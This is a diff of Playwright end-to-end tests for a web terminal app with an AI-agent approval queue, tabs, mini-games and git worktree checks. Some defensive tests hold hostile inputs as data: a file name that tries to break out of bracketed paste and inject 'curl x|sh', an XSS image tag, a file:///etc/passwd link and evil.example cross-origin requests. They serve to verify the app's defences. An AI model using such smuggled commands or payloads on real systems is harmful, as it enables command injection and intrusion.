@@ -59,6 +59,28 @@ test.describe('demo mode (no backend)', () => {
     expect(r).toEqual({ version: '11', x: 2 });
   });
 
+  test('OSC 8 hyperlinks: web links open in a new tab, other schemes are ignored', async ({ page }) => {
+    await trackTerms(page);
+    await boot(page, '/?demo');
+    await page.evaluate(() => new Promise((ok) => window.__terms[0].write(
+      '\r\n\x1b]8;;https://example.com/ok\x1b\\WEBLINK\x1b]8;;\x1b\\ \x1b]8;;file:///etc/passwd\x1b\\FILELINK\x1b]8;;\x1b\\', ok)));
+    // the renderer is canvas/WebGL, so click by cell: the links are on the cursor row
+    const link = async (col) => {
+      const b = await page.evaluate((c) => {
+        const t = window.__terms[0], r = t.element.querySelector('.xterm-screen').getBoundingClientRect();
+        return { x: r.x + (c + 0.5) * r.width / t.cols, y: r.y + (t.buffer.active.cursorY + 0.5) * r.height / t.rows };
+      }, col);
+      return { click: async () => { await page.mouse.move(b.x, b.y); await page.waitForTimeout(100); await page.mouse.click(b.x, b.y); } };
+    };
+    const popup = page.waitForEvent('popup');
+    await (await link(2)).click();
+    expect((await popup).url()).toBe('https://example.com/ok');
+    let opened = false; page.on('popup', () => { opened = true; });
+    await (await link(9)).click();
+    await page.waitForTimeout(300);
+    expect(opened).toBe(false);
+  });
+
   test('xterm 6 scrollbar: thin, under the resize grips, wheel scrolls; resize snaps flush to the last row', async ({ page }) => {
     await trackTerms(page);
     await boot(page, '/?demo');
@@ -191,6 +213,22 @@ test.describe('demo mode (no backend)', () => {
     expect(errors).toEqual([]);
   });
 
+  test('saved lists with broken entries (older build, hand-edited import): the bad ones are skipped, the palette still works', async ({ page }) => {
+    const errors = [];
+    page.on('pageerror', (e) => errors.push(e.message));
+    await page.addInitScript(() => {
+      localStorage.setItem('td.snippets.v1', JSON.stringify([{ name: 'old', cmd: 'echo old' }, null, 'x', { id: 'sn1', label: 'deploy', cmd: 'echo ok' }]));
+      localStorage.setItem('td.ssh.v1', JSON.stringify({ not: 'a list' }));
+      localStorage.setItem('td.aicli.v1', JSON.stringify([{ label: 'x' }]));
+    });
+    await boot(page, '/?demo');
+    await openPalette(page);
+    await page.locator('#pal-input').fill('o');                         // matches every entry's text, good or bad
+    await expect(labels(page).filter({ hasText: 'deploy' })).toHaveCount(1);
+    await page.waitForTimeout(200);
+    expect(errors).toEqual([]);
+  });
+
   test('palette shows labels as text, never as markup (with and without a search)', async ({ page }) => {
     const label = '<img src=x onerror="window.__pwned=1">snip';
     await page.addInitScript((l) => localStorage.setItem('td.snippets.v1', JSON.stringify([{ id: 'sn1', label: l, cmd: 'echo hi' }])), label);
@@ -310,6 +348,164 @@ test.describe('demo mode (no backend)', () => {
     await expect(page.locator('#palette')).toHaveClass(/open/);
     await expect(page.locator('#pal-cats .pal-cat.on')).toHaveText('Agents');
     await expect(page.locator('#pal-input')).toBeFocused();
+  });
+  test('first-run tour counts as seen as soon as it shows: leaving mid-tour does not bring it back', async ({ page }) => {
+    await page.goto('/?demo');
+    await expect(page.locator('.tour')).toBeVisible();
+    await page.reload();                                                // no Skip / Esc / Finish
+    await page.waitForTimeout(1600);
+    await expect(page.locator('.tour')).toHaveCount(0);
+  });
+
+  test('logo easter eggs: a click lights the brand like neon, a double-click spins the mark; both settle', async ({ page }) => {
+    await boot(page, '/?demo');
+    const brand = page.locator('.brand'), mark = page.locator('.brand .dot');
+    await brand.click();
+    await expect(brand).toHaveClass(/neon/);
+    await expect(brand).not.toHaveClass(/neon/, { timeout: 3000 });
+    await page.locator('.brand').dblclick();
+    await expect(mark).toHaveClass(/spin/);
+    expect(await mark.evaluate((m) => m.getAnimations({ subtree: true }).filter((a) => a.animationName === 'brand-orbit').length)).toBe(3);   // the pair orbits, each square counter-turns
+    await expect(mark).not.toHaveClass(/spin/, { timeout: 3000 });
+  });
+
+  test('mini-games remember the best score per game across reloads; a lower score never replaces it', async ({ page }) => {
+    /* global gState, gBest, COLS -- the app's page globals, used inside page.evaluate() */
+    await boot(page, '/?demo');
+    // Snake heading right into the wall with `score` points, then wait for its game over.
+    const crash = async (score) => {
+      await page.evaluate((n) => { gState.score = n; gState.body = [{ x: COLS - 1, y: 5 }]; gState.tick = gState.every; }, score);
+      await expect.poll(() => page.evaluate(() => gState.over)).toBe(true);
+    };
+    await page.keyboard.press('ControlOrMeta+Alt+KeyG');
+    await expect(page.locator('#game-overlay')).toHaveClass(/open/);
+    await page.locator('#game-pick').selectOption('snake');
+    await crash(3);
+    expect(await page.evaluate(() => ({ best: gBest(), newBest: gState.newBest }))).toEqual({ best: 3, newBest: true });
+    await page.keyboard.press('Space');                                  // restart
+    await crash(1);
+    expect(await page.evaluate(() => ({ best: gBest(), newBest: !!gState.newBest }))).toEqual({ best: 3, newBest: false });
+    await page.locator('#game-pick').selectOption('dino');              // each game keeps its own
+    expect(await page.evaluate(() => gBest())).toBe(0);
+
+    await page.reload();
+    await expect(page.locator('.win')).toHaveCount(1);
+    await page.keyboard.press('ControlOrMeta+Alt+KeyG');
+    await page.locator('#game-pick').selectOption('snake');
+    expect(await page.evaluate(() => gBest())).toBe(3);
+  });
+
+  test('project tab right-click: Rename edits the name in place; Delete is off for the last project', async ({ page }) => {
+    await boot(page, '/?demo');
+    const tab = page.locator('.ptab').first();
+    await expect(tab.locator('.pname')).toHaveAttribute('title', /Double-click to rename/);
+    await tab.click({ button: 'right' });
+    await expect(page.locator('.ctxmenu .ctx-item', { hasText: 'Delete project' })).toHaveClass(/disabled/);
+    await page.locator('.ctxmenu .ctx-item', { hasText: 'Rename' }).click();
+    await expect(tab.locator('.pname')).toBeFocused();
+    await page.keyboard.type('api');                                   // the whole old name was selected, so typing replaces it
+    await page.keyboard.press('Enter');
+    await expect(tab.locator('.pname')).toHaveText('api');
+    await expect(tab.locator('.pname')).toHaveAttribute('contenteditable', 'false');
+  });
+
+  test('project tabs: hover arrow moves a tab one left (not on the first tab); menu moves right; order survives reload', async ({ page }) => {
+    await boot(page, '/?demo');
+    await page.locator('#padd').click();
+    await page.locator('#padd').click();
+    const names = () => page.locator('.ptab .pname').allTextContents();
+    expect(await names()).toEqual(['default', 'project 1', 'project 2']);
+    const first = page.locator('.ptab').first();
+    await first.hover();
+    await expect(first.locator('.pleft')).toBeHidden();                // nowhere to go
+    const second = page.locator('.ptab').nth(1);                      // (headless Firefox on Linux never hovers further right in this bar)
+    await second.hover();
+    await second.locator('.pleft').click();
+    expect(await names()).toEqual(['project 1', 'default', 'project 2']);
+    await page.locator('.ptab').nth(1).click({ button: 'right' });
+    await page.locator('.ctxmenu .ctx-item', { hasText: 'Move right' }).click();
+    expect(await names()).toEqual(['project 1', 'project 2', 'default']);
+    await page.waitForTimeout(800);                                     // let the debounced save land
+    await page.reload();
+    await expect(page.locator('.ptab')).toHaveCount(3);
+    expect(await names()).toEqual(['project 1', 'project 2', 'default']);
+  });
+
+  test('resizing the window keeps the pets on the floor and on screen, at once (no float, no off-screen glide back)', async ({ page }) => {
+    await page.addInitScript(() => localStorage.setItem('td.pets.v1', 'on'));
+    await page.setViewportSize({ width: 1400, height: 800 });
+    await boot(page, '/?demo');
+    await expect(page.locator('#petfield .pet')).toHaveCount(3);
+    // every pet's box inside the field, its bottom within the 40px floor strip; measured two frames after the resize
+    const placed = () => page.evaluate(() => new Promise((ok) => requestAnimationFrame(() => requestAnimationFrame(() => {
+      const f = document.getElementById('petfield').getBoundingClientRect();
+      ok([...document.querySelectorAll('#petfield .pet')].every((p) => {
+        const r = p.getBoundingClientRect();
+        return r.left >= f.left - 1 && r.right <= f.right + 1 && r.bottom <= f.bottom + 1 && f.bottom - r.bottom <= 40;
+      }));
+    }))));
+    for (const size of [{ width: 700, height: 450 }, { width: 1400, height: 800 }, { width: 500, height: 800 }]) {
+      await page.setViewportSize(size);
+      expect(await placed(), `${size.width}x${size.height}`).toBe(true);
+    }
+  });
+
+  test('AltGr (Ctrl+Alt on Windows/Linux European layouts) is typing, never a shortcut', async ({ page }) => {
+    await boot(page, '/?demo');
+    const key = (init) => page.evaluate((i) => document.body.dispatchEvent(new KeyboardEvent('keydown', { ...i, ctrlKey: true, altKey: true, bubbles: true })), init);
+    await key({ key: 'ţ', code: 'KeyT', modifierAltGraph: true });               // AltGr+T: a character, not "New terminal"
+    await page.waitForTimeout(200);
+    await expect(page.locator('.win')).toHaveCount(1);
+    await key({ key: 't', code: 'KeyT' });                                      // a real Ctrl+Alt+T still works
+    await expect(page.locator('.win')).toHaveCount(2);
+  });
+
+  test('⌘⌥ / Ctrl+Alt shortcuts work while a terminal has focus (Windows/Linux: xterm must not take them)', async ({ page }) => {
+    await boot(page, '/?demo');
+    await page.locator('.win .xterm').first().click({ force: true });
+    await expect(page.locator('.xterm-helper-textarea').first()).toBeFocused();
+    await page.keyboard.press('ControlOrMeta+Alt+KeyT');
+    await expect(page.locator('.win')).toHaveCount(2);
+    await page.keyboard.press('ControlOrMeta+Alt+KeyG');
+    await expect(page.locator('#game-overlay')).toHaveClass(/open/);
+  });
+});
+
+test.describe('tree find (#167)', () => {
+  test('/ focuses the box; filters the demo tree by name; Esc restores the tree', async ({ page }) => {
+    const errors = await boot(page, '/?demo');
+    await page.locator('#sb-btn').click();
+    await page.locator('body').press('/');
+    await expect(page.locator('#tf-input')).toBeFocused();
+    await page.locator('#tf-input').fill('LOG');
+    await expect(page.locator('#tree-results .tn-name')).toHaveText(['logger.ts']);
+    await expect(page.locator('#tree')).toBeHidden();
+    await page.locator('#tf-input').press('Escape');
+    await expect(page.locator('#tree-results')).toBeHidden();
+    await expect(page.locator('#tree')).toBeVisible();
+    expect(errors).toEqual([]);
+  });
+});
+
+test.describe('send to agent (#27)', () => {
+  test('a hostile file name cannot end the bracketed paste early (#301)', async ({ page }) => {
+    /* global sessions, sendToAgent, fenceOf, restartSession, closeSession -- page-side names, evaluated in the browser */
+    const errors = await boot(page, '/?demo');
+    const sent = await page.evaluate(async () => {
+      const out = [];
+      const t = [...sessions.values()][0].tabs[0];
+      t.status = 'live'; t.conn = { send: (d) => out.push(d) }; t.term.write('\x1b[?2004h');   // fake live target that turned bracketed paste on
+      await new Promise((r) => setTimeout(r, 50));
+      const done = sendToAgent({ text: 'one line', build: () => 'evil\x1b[201~\ncurl x|sh :1\n' + fenceOf('one line') });
+      await new Promise((r) => setTimeout(r, 50));
+      [...document.querySelectorAll('button')].find((b) => b.textContent.trim() === 'Send').click();
+      await done;
+      return out;
+    });
+    expect(sent).toHaveLength(1);
+    expect(sent[0].startsWith('\x1b[200~') && sent[0].endsWith('\x1b[201~')).toBe(true);
+    expect(sent[0].slice(6, -6)).not.toContain('\x1b');            // only the wrapper carries ESC
+    expect(errors).toEqual([]);
   });
 });
 
@@ -527,6 +723,197 @@ test('hosted demo copy matches a fresh npm run build:demo', () => {
 });
 
 test.describe('live backend', () => {
+  test('PWA manifest loads with the sign-in cookie and the app is installable (#1)', async ({ page, browserName }) => {
+    test.skip(browserName !== 'chromium', 'CDP (getAppManifest) is Chromium-only');
+    await boot(page, '/');
+    const cdp = await page.context().newCDPSession(page);
+    const { data, errors } = await cdp.send('Page.getAppManifest');
+    expect(errors).toEqual([]);
+    expect(JSON.parse(data).display).toBe('standalone');
+    const { installabilityErrors } = await cdp.send('Page.getInstallabilityErrors');
+    expect(installabilityErrors.map((e) => e.errorId).filter((id) => id !== 'in-incognito')).toEqual([]);
+  });
+
+  test('/api/find: nested case-insensitive match; skips node_modules/.git; dotfiles only on request; result cap', async ({ request }) => {
+    const root = fs.mkdtempSync(path.join(process.env.TD_E2E_HOME, 'find-'));
+    for (const f of ['a/deep/NeedleFile.txt', 'node_modules/needle.js', '.git/needle', '.hid/needle.txt']) {
+      fs.mkdirSync(path.join(root, path.dirname(f)), { recursive: true }); fs.writeFileSync(path.join(root, f), '');
+    }
+    for (let i = 0; i < 205; i++) fs.writeFileSync(path.join(root, `bulk${i}.log`), '');
+    const find = async (q, extra = '') => (await request.get(`/api/find?dir=${encodeURIComponent(root)}&q=${q}${extra}`)).json();
+    expect((await find('NEEDLE')).results).toEqual([{ path: 'a/deep/NeedleFile.txt', dir: false }]);
+    expect((await find('needle', '&all=1')).results.map((r) => r.path).sort()).toEqual(['.hid/needle.txt', 'a/deep/NeedleFile.txt']);
+    const bulk = await find('bulk');
+    expect([bulk.results.length, bulk.truncated]).toEqual([200, true]);
+    expect((await request.get('/api/find?dir=/nonexistent-td-path&q=x')).status()).toBe(404);
+    fs.rmSync(root, { recursive: true, force: true });
+  });
+
+  test('/api/git/check: runs the typed command in an agent worktree only; pass, fail, guard', async ({ request }) => {
+    const root = fs.mkdtempSync(path.join(process.env.TD_E2E_HOME, 'check-'));
+    const main = path.join(root, 'repo'), tree = path.join(root, 'repo-worktrees', 'task');
+    const git = (cwd, ...a) => execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { cwd, stdio: 'pipe' });
+    fs.mkdirSync(main); fs.mkdirSync(path.dirname(tree));
+    git(main, 'init', '-q', '-b', 'main'); git(main, 'commit', '-q', '--allow-empty', '-m', 'init');
+    git(main, 'worktree', 'add', '-q', tree, '-b', 'task');
+    const check = (dir, cmd, headers) => request.post('/api/git/check', { data: { dir, check: cmd }, headers });
+    expect(await (await check(tree, 'echo hi')).json()).toEqual({ ok: true, error: '', output: 'hi' });
+    const bad = await (await check(tree, 'echo bad; exit 3')).json();
+    expect([bad.ok, bad.error, bad.output]).toEqual([false, 'Check failed (exit 3)', 'bad']);
+    expect((await check(main, 'echo hi')).status()).toBe(400);              // the main tree is not an agent worktree
+    expect((await check(tree, '  ')).status()).toBe(400);                   // empty command
+    expect((await check(tree, 'echo hi', { 'Sec-Fetch-Site': 'cross-site' })).status()).toBe(403);
+    expect((await (await request.get(`/api/git/diff?dir=${encodeURIComponent(tree)}&base=HEAD`)).json()).main).toBe(fs.realpathSync(main));
+    git(main, 'checkout', '-q', '--detach');                                 // an unrelated main-tree state must not block a check
+    expect((await (await check(tree, 'echo hi')).json()).ok).toBe(true);
+    fs.rmSync(root, { recursive: true, force: true });
+  });
+
+  test('/api/git/check: a client that goes away (Cancel) kills the check and frees the worktree', async ({ request }) => {
+    const root = fs.mkdtempSync(path.join(process.env.TD_E2E_HOME, 'check-'));
+    const main = path.join(root, 'repo'), tree = path.join(root, 'repo-worktrees', 'task'), marker = path.join(root, 'ran');
+    const git = (cwd, ...a) => execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { cwd, stdio: 'pipe' });
+    fs.mkdirSync(main); fs.mkdirSync(path.dirname(tree));
+    git(main, 'init', '-q', '-b', 'main'); git(main, 'commit', '-q', '--allow-empty', '-m', 'init');
+    git(main, 'worktree', 'add', '-q', tree, '-b', 'task');
+    const check = (cmd, timeout) => request.post('/api/git/check', { data: { dir: tree, check: cmd }, timeout });
+    await expect(check(`sleep 2; touch ${marker}`, 500)).rejects.toThrow();     // the client gives up after 0.5 s
+    await new Promise((r) => setTimeout(r, 2500));
+    expect(fs.existsSync(marker)).toBe(false);                                  // the check was killed, not left running
+    expect((await (await check('echo hi')).json()).ok).toBe(true);              // and the worktree is free again (no 409)
+    fs.rmSync(root, { recursive: true, force: true });
+  });
+
+  test('review view: Run check shows pass in green and fail in red; Cancel stops a running check', async ({ page }) => {
+    const root = fs.mkdtempSync(path.join(process.env.TD_E2E_HOME, 'check-'));
+    const main = path.join(root, 'repo'), tree = path.join(root, 'repo-worktrees', 'task');
+    const git = (cwd, ...a) => execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { cwd, stdio: 'pipe' });
+    fs.mkdirSync(main); fs.mkdirSync(path.dirname(tree));
+    git(main, 'init', '-q', '-b', 'main'); git(main, 'commit', '-q', '--allow-empty', '-m', 'init');
+    git(main, 'worktree', 'add', '-q', tree, '-b', 'task');
+    fs.writeFileSync(path.join(tree, 'a.txt'), 'x');
+    await boot(page, '/');
+    /* eslint-disable no-undef -- projects, activeProject, openAgentDiff are the app's page globals */
+    await page.evaluate((dir) => { const p = projects.get(activeProject); p.root = dir; p.base = 'HEAD'; openAgentDiff(); }, tree);
+    /* eslint-enable no-undef */
+    const run = async (cmd) => {
+      await page.getByRole('button', { name: 'Run check…' }).click();
+      await page.getByPlaceholder('npm test').fill(cmd);
+      await page.getByRole('button', { name: 'Run', exact: true }).click();
+    };
+    const status = page.locator('pre[role=status]');
+    await run('echo fine');
+    await expect(status.locator('.d-add')).toHaveText('✓ Check passed');
+    await run('echo nope; exit 1');
+    await expect(status.locator('.d-del')).toHaveText('✗ Check failed (exit 1)'); await expect(status).toContainText('nope');   // the output is shown, uncoloured
+    await run('sleep 30');
+    await page.getByRole('button', { name: 'Cancel' }).click();
+    await expect(status).toHaveText('Check cancelled');
+    await expect(page.getByRole('button', { name: 'Run check…' })).toBeVisible();
+    // The last finished result survives closing the view: coloured while the diff is unchanged, muted once it differs.
+    const reopen = () => page.evaluate(() => openAgentDiff());   // eslint-disable-line no-undef -- the app's page global
+    await reopen();
+    await expect(status.locator('.d-del')).toHaveText(/^✗ Last check failed · echo nope; exit 1 · just now$/);
+    fs.writeFileSync(path.join(tree, 'b.txt'), 'y');
+    await reopen();
+    await expect(status.locator('.d-del, .d-add')).toHaveCount(0);
+    await expect(status).toContainText('Last check failed · echo nope; exit 1');
+    await expect(status).toContainText('the changes differ now, run it again');
+    fs.rmSync(root, { recursive: true, force: true });
+  });
+
+  test('review view: files that run code, carry secrets or pin dependencies are flagged', async ({ page }) => {
+    const root = fs.mkdtempSync(path.join(process.env.TD_E2E_HOME, 'risky-'));
+    const main = path.join(root, 'repo'), tree = path.join(root, 'repo-worktrees', 'task');
+    const git = (cwd, ...a) => execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { cwd, stdio: 'pipe' });
+    fs.mkdirSync(main); fs.mkdirSync(path.dirname(tree));
+    git(main, 'init', '-q', '-b', 'main'); git(main, 'commit', '-q', '--allow-empty', '-m', 'init');
+    git(main, 'worktree', 'add', '-q', tree, '-b', 'task');
+    for (const f of ['package-lock.json', '.github/workflows/ci.yml', '.env.local', 'src/app.js', 'docs/env.md']) {
+      fs.mkdirSync(path.dirname(path.join(tree, f)), { recursive: true }); fs.writeFileSync(path.join(tree, f), 'x');
+    }
+    await boot(page, '/');
+    /* eslint-disable no-undef -- projects, activeProject, openAgentDiff are the app's page globals */
+    await page.evaluate((dir) => { const p = projects.get(activeProject); p.root = dir; p.base = 'HEAD'; openAgentDiff(); }, tree);
+    /* eslint-enable no-undef */
+    const flagged = page.locator('.fv-body .d-hunk');
+    await expect(flagged.first()).toContainText('Review closely');
+    const text = (await flagged.allTextContents()).join('');
+    expect(text).toMatch(/lockfile\s+package-lock\.json/);
+    expect(text).toMatch(/CI config\s+\.github\/workflows\/ci\.yml/);
+    expect(text).toMatch(/secrets\/env\s+\.env\.local/);
+    expect(text).not.toContain('app.js');                                   // ordinary source is not flagged
+    expect(text).not.toContain('env.md');
+    fs.rmSync(root, { recursive: true, force: true });
+  });
+
+  test('agent queue: a question is answered from its card, a plan is reviewed and approved (#280)', async ({ page }) => {
+    const ids = [];
+    page.on('websocket', (ws) => { const m = /[?&]id=([^&]+)/.exec(ws.url()); if (m) ids.push(decodeURIComponent(m[1])); });
+    await boot(page, '/');
+    await expect.poll(() => ids.length).toBe(1);
+    const id = ids[0];
+    // page.request carries the sign-in cookie, so the request is held for a click like a real hook's
+    const hold = (tool, ask) => page.request.post('/api/agent-events', { data: { id, type: 'permission_request', agent: 'claude', tool, wait: true, ask } });
+    await page.request.post('/api/agent-events', { data: { id, type: 'tool_start', agent: 'claude', tool: 'Read' } });   // tags the terminal as an agent
+    await page.locator('#agent-btn').click();
+
+    const questions = [
+      { question: 'Pick a color', header: 'Color', multiSelect: false, options: [{ label: 'Red' }, { label: 'Blue' }] },
+      { question: 'Extras?', header: 'X', multiSelect: true, options: [{ label: '<b>A</b>' }, { label: 'B' }, { label: 'C' }] },
+    ];
+    const held = hold('AskUserQuestion', { questions });
+    const card = page.locator('.agent-q');
+    await expect(card.locator('.agent-q-text')).toHaveText('Pick a color');
+    await expect(page.locator('.agent-row-btns .agent-btn.allow', { hasText: 'Approve' })).toHaveCount(0);   // no plain Approve on a question
+    const next = card.getByRole('button', { name: 'Next' });
+    await expect(next).toBeDisabled();
+    await card.focus(); await page.keyboard.press('2');                       // key 2 = Blue
+    await expect(next).toBeEnabled();
+    await next.click();
+    await expect(card.locator('.agent-q-text')).toHaveText('Extras?');
+    await expect(card.locator('.agent-opt').first().locator('span')).toHaveText('<b>A</b>');   // shown as text, not parsed
+    await card.locator('.agent-opt').nth(0).click(); await card.locator('.agent-opt').nth(2).click();
+    await card.locator('.agent-q-other').fill('typed');
+    await card.getByRole('button', { name: 'Send answer' }).click();
+    const r = await held;
+    expect(r.status()).toBe(200);
+    expect(await r.json()).toEqual({ decision: 'allow', answers: { 'Pick a color': 'Blue', 'Extras?': '<b>A</b>, C, typed' } });
+
+    const plan = hold('ExitPlanMode', { plan: '# My plan\n\n1. do <script>x</script>' });
+    await page.locator('.agent-row-btns .agent-btn', { hasText: 'Review plan' }).click();
+    await expect(page.locator('#fv-body h1')).toHaveText('My plan');
+    expect(await page.locator('#fv-body script').count()).toBe(0);
+    await page.keyboard.press('Escape');
+    if (!(await page.locator('.agent-row').first().isVisible())) await page.locator('#agent-btn').click();   // the viewer may have closed the queue
+    await page.locator('.agent-row-btns .agent-btn.allow', { hasText: 'Approve' }).click();
+    expect(await (await plan).json()).toEqual({ decision: 'allow' });
+  });
+
+  test('agent queue: two requests at once show "1 of 2" and are answered one by one (#286)', async ({ page }) => {
+    const ids = [];
+    page.on('websocket', (ws) => { const m = /[?&]id=([^&]+)/.exec(ws.url()); if (m) ids.push(decodeURIComponent(m[1])); });
+    await boot(page, '/');
+    await expect.poll(() => ids.length).toBe(1);
+    const id = ids[0];
+    const hold = (detail, sub) => page.request.post('/api/agent-events', { data: { id, type: 'permission_request', agent: 'claude', tool: 'Bash', detail, wait: true, ...(sub ? { sub } : {}) } });
+    await page.request.post('/api/agent-events', { data: { id, type: 'tool_start', agent: 'claude', tool: 'Read' } });
+    await page.locator('#agent-btn').click();
+    const first = hold('echo first'), second = hold('echo second', 'agent-1');
+    const nav = page.locator('.agent-ask-nav');
+    await expect(nav).toHaveText(/1 of 2 waiting/);
+    const shown = page.locator('.agent-row-ask');
+    await expect(shown).toHaveText('Bash echo first');
+    await nav.getByRole('button', { name: '›' }).click();
+    await expect(shown).toHaveText('sub-agent · Bash echo second');
+    await page.locator('.agent-row-btns .agent-btn.deny', { hasText: 'Deny' }).click();   // answers the one shown
+    expect(await (await second).json()).toEqual({ decision: 'deny' });
+    await expect(nav).toHaveCount(0);                                                      // one left: no counter
+    await expect(shown).toHaveText('Bash echo first');
+    await page.locator('.agent-row-btns .agent-btn.allow', { hasText: 'Approve' }).click();
+    expect(await (await first).json()).toEqual({ decision: 'allow' });
+  });
+
   test('agent queue: red → amber → working, badge follows', async ({ page, request }) => {
     const ids = [];
     page.on('websocket', (ws) => { const m = /[?&]id=([^&]+)/.exec(ws.url()); if (m) ids.push(decodeURIComponent(m[1])); });
@@ -574,6 +961,19 @@ test.describe('live backend', () => {
     await expect(page.locator('.win .badge.cmd').first()).toHaveText('$ echo hey');
   });
 
+  test('a reload replays old terminal queries without answering them again (no stray "1;2c0;276;0c" typed into the shell)', async ({ page }) => {
+    await boot(page, '/');
+    await page.locator('.win .xterm').first().click({ force: true });
+    await page.keyboard.type("printf '\\033[c\\033[>c'; echo QUERIED\n");      // DA1 + DA2 queries land in the replay buffer
+    await expect(page.locator('.win .badge.cmd').first()).toContainText('QUERIED');
+    const sent = [];
+    page.on('websocket', (ws) => ws.on('framesent', (f) => sent.push(String(f.payload))));
+    await page.reload();
+    await expect(page.locator('.win .xterm')).toHaveCount(1);
+    await page.waitForTimeout(1500);                                        // reattach + replay written
+    expect(sent.filter((f) => /1;2c|>0;\d+;\d+c/.test(f))).toEqual([]);
+  });
+
   test('version shown; no toast on first visit; "Updated" toast once per version opens What\'s new (#88)', async ({ page, request }) => {
     const { version } = await (await request.get('/api/version')).json();
     await boot(page, '/');
@@ -612,7 +1012,7 @@ test.describe('live backend', () => {
     await expect(res).toContainText('Couldn');
   });
 
-  test('live overview shows each session\'s output as a tile; click jumps; Esc closes (#25)', async ({ page }) => {
+  test('live overview shows each session\'s output as a tile; click or Enter jumps; Esc closes (#25)', async ({ page }) => {
     await boot(page, '/');
     await page.locator('.win .xterm').first().click({ force: true });
     await page.keyboard.type('echo OVERVIEW_$((6*7))\n');
@@ -622,7 +1022,16 @@ test.describe('live backend', () => {
     await page.keyboard.press('Enter');
     await expect(page.locator('#ov-overlay.open .ov-tile')).toHaveCount(1);
     await expect(page.locator('.ov-out').first()).toContainText('OVERVIEW_42', { timeout: 5000 });
-    await page.locator('.ov-tile').first().click();
+    await page.locator('.ov-tile .ov-out').first().click();              // anywhere on the tile, not just the header
+    await expect(page.locator('#ov-overlay.open')).toHaveCount(0);
+    await openPalette(page);
+    await page.locator('#pal-input').fill('Live overview');
+    await expect(page.locator('.pal-item.hi', { hasText: 'Live overview' })).toBeVisible();
+    await page.keyboard.press('Enter');
+    const head = page.locator('.ov-tile-h').first();                    // keyboard: the header is a real button
+    await expect(head).toHaveAccessibleName(/running|idle/);
+    await head.focus();
+    await page.keyboard.press('Enter');
     await expect(page.locator('#ov-overlay.open')).toHaveCount(0);
     await openPalette(page);
     await page.locator('#pal-input').fill('Live overview');
@@ -645,6 +1054,44 @@ test.describe('live backend', () => {
     await page.locator('.win .wbtn.restart').click();
     await expect(page.locator('.win.dead')).toHaveCount(0);
     await expect.poll(() => page.evaluate(() => window.__other.readyState)).toBe(3);   // and the other one is closed now
+  });
+
+  test('⟳ with a live tab, and a wake while still connecting, never mark the shell dead (#300)', async ({ page }) => {
+    const ids = [];
+    page.on('websocket', (ws) => { const m = /[?&]id=([^&]+)/.exec(ws.url()); if (m) ids.push(decodeURIComponent(m[1])); });
+    await boot(page, '/');
+    await expect.poll(() => ids.length).toBe(1);
+    const status = () => page.evaluate(() => [...sessions.values()][0].tabs[0].status);
+    await expect.poll(status).toBe('live');
+    await page.evaluate(() => restartSession([...sessions.values()][0]));   // ⟳ is only shown when some tab is dead; the live ones must keep their socket
+    await page.evaluate(() => {                                          // wake while a tab is "reconnecting" with a socket still connecting
+      const tab = [...sessions.values()][0].tabs[0];
+      tab.reconnecting = true; document.dispatchEvent(new Event('visibilitychange'));
+    });
+    await page.waitForTimeout(1500);                                     // a "taken" from a doubled socket would arrive by now
+    await expect(page.locator('.win.dead')).toHaveCount(0);
+    expect(await status()).toBe('live');
+  });
+
+  test('closing a window whose socket is not open still ends its shell over HTTP (#302)', async ({ page }) => {
+    const kills = [];
+    page.on('request', (r) => { if (r.url().includes('/api/session-kill')) kills.push(JSON.parse(r.postData() || '{}').id); });
+    await boot(page, '/');
+    const status = () => page.evaluate(() => [...sessions.values()][0].tabs[0].status);
+    await expect.poll(status).toBe('live');
+    const sid = await page.evaluate(() => { const s = [...sessions.values()][0]; return s.id + '-' + s.tabs[0].id; });
+    await page.evaluate(() => { const s = [...sessions.values()][0]; s.tabs[0].conn.close(); closeSession(s); });   // socket closing = "reconnecting": no kill message can go out
+    await expect.poll(() => kills).toEqual([sid]);
+  });
+
+  test('closing a window with an open socket kills over the socket, not HTTP (#302)', async ({ page }) => {
+    const kills = [];
+    page.on('request', (r) => { if (r.url().includes('/api/session-kill')) kills.push(r.url()); });
+    await boot(page, '/');
+    await expect.poll(() => page.evaluate(() => [...sessions.values()][0].tabs[0].status)).toBe('live');
+    await page.evaluate(() => closeSession([...sessions.values()][0]));
+    await page.waitForTimeout(500);
+    expect(kills).toEqual([]);
   });
 
   test('terminal runs a command; reload reattaches and replays the buffer', async ({ page }) => {
@@ -828,7 +1275,7 @@ test.describe('live backend', () => {
     expect(home.headers()['x-content-type-options']).toBe('nosniff');
     expect(home.headers()['referrer-policy']).toBe('no-referrer');
     const q = encodeURIComponent(process.env.TD_E2E_HOME);
-    for (const p of [`/api/ls?dir=${q}`, `/api/read?path=${q}/README.md`, `/api/stat?path=${q}/README.md`, '/api/layouts', '/api/shells', '/debug']) {
+    for (const p of [`/api/ls?dir=${q}`, `/api/read?path=${q}/README.md`, `/api/stat?path=${q}/README.md`, `/api/find?dir=${q}&q=readme`, '/api/layouts', '/api/shells', '/debug']) {
       expect((await request.get(p)).status(), p).toBe(200);
       expect((await request.get(p, { headers: { 'Sec-Fetch-Site': 'cross-site' } })).status(), p + ' cross-site').toBe(403);
     }
@@ -961,5 +1408,30 @@ test.describe('live backend', () => {
     expect((await post({ name: '', data: full.data })).status()).toBe(400);                           // no name
     expect((await post({ name: 'x', data: full.data }, { Origin: 'http://evil.example' })).status()).toBe(403);
     expect((await post({ name: 'x', data: full.data }, { 'Sec-Fetch-Site': 'cross-site' })).status()).toBe(403);
+  });
+  test('snooze: the server takes an end time for the webhook, nothing else', async ({ request }) => {
+    expect((await request.post('/api/snooze', { data: { until: 'soon' } })).status()).toBe(400);
+    expect((await request.post('/api/snooze', { data: { until: -1 } })).status()).toBe(400);
+    expect((await request.post('/api/snooze', { data: { until: 0 } })).status()).toBe(204);
+    expect((await request.post('/api/snooze', { data: { until: 0 }, headers: { Origin: 'http://evil.example' } })).status()).toBe(403);
+  });
+
+  test('snooze: agent toasts are held back, the header shows the time left, the end shows a summary', async ({ page }) => {
+    await page.clock.install({ time: new Date('2026-01-01T00:00:00Z') });
+    await boot(page, '/?demo');
+    const toasts = () => page.locator('.toast').allTextContents();
+    await page.evaluate(() => window.snoozeFor(30));
